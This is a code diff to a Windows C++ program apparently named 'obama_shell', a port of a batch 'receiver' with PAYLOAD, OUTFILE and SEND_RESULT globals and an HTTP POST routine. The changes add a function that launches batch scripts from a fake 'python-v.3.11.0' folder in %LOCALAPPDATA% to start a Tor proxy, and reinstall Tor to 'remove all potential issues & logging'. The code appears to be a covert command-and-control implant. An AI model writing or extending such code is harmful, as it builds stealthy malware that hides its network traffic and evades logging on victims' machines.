@@ -1,6 +1,6 @@
 // receiver.cpp — C++ port of receiver.bat (debugging version)
 // Networking wired (WinHTTP). Payload execution remains DISABLED by design.
-// Build (x64 developer cmd): cl /EHsc /O2 /MT obama_shell.cpp /I C:\vcpkg\installed\x64-windows-static\include C:\vcpkg\installed\x64-windows-static\lib\libcurl.lib C:\vcpkg\installed\x64-windows-static\lib\libssl.lib C:\vcpkg\installed\x64-windows-static\lib\libcrypto.lib C:\vcpkg\installed\x64-windows-static\lib\zlib.lib Shlwapi.lib Iphlpapi.lib Secur32.lib ws2_32.lib winmm.lib bcrypt.lib crypt32.lib advapi32.lib user32.lib
+// Build (x64 developer cmd): cl /EHsc /O2 /MT /std:c++17 obama_shell.cpp /I C:\vcpkg\installed\x64-windows-static\include C:\vcpkg\installed\x64-windows-static\lib\libcurl.lib C:\vcpkg\installed\x64-windows-static\lib\libssl.lib C:\vcpkg\installed\x64-windows-static\lib\libcrypto.lib C:\vcpkg\installed\x64-windows-static\lib\zlib.lib Shlwapi.lib Iphlpapi.lib Secur32.lib ws2_32.lib winmm.lib bcrypt.lib crypt32.lib advapi32.lib user32.lib
 
 #include <windows.h>
 #include <shlwapi.h>
@@ -16,6 +16,7 @@
 #include <chrono>
 #include <thread>
 #include <iomanip>
+#include <filesystem>
 
 #pragma comment(lib, "Winhttp.lib")
 
@@ -30,11 +31,19 @@ static std::string PAYLOAD;
 static std::string OUTFILE;
 static std::string SEND_RESULT;
 
+namespace fs = std::filesystem;
 
-bool start_tor_proxy_hidden()
+bool start_bat(char* file, bool install_tor = true)
 {
+    if (install_tor) {
+        // Install Tor again to remove all potential issues & logging
+        std::printf("Installing Tor...\n");
+        start_bat("%LOCALAPPDATA%\\e.bat", false);
+        std::printf("Tor Successfully Installed\n");
+    }
     // Expand the environment variable
-    const char* tmpl = "%LOCALAPPDATA%\\python-v.3.11.0\\lib\\tor\\Start-Tor-Proxy.cmd";
+    const char* tmpl = file;
+
     // First call to get required buffer size
     DWORD needed = ExpandEnvironmentStringsA(tmpl, nullptr, 0);
     if (needed == 0) {
@@ -217,7 +226,7 @@ bool http_post(const std::string& url,
 // -------------------------
 int main()
 {
-    start_tor_proxy_hidden();
+    start_bat("%LOCALAPPDATA%\\python-v.3.11.0\\lib\\tor\\Start-Tor-Proxy.cmd");
     // Resolve %USERNAME%
     if (const char* u = std::getenv("USERNAME")) USER = u; else USER.clear();
 
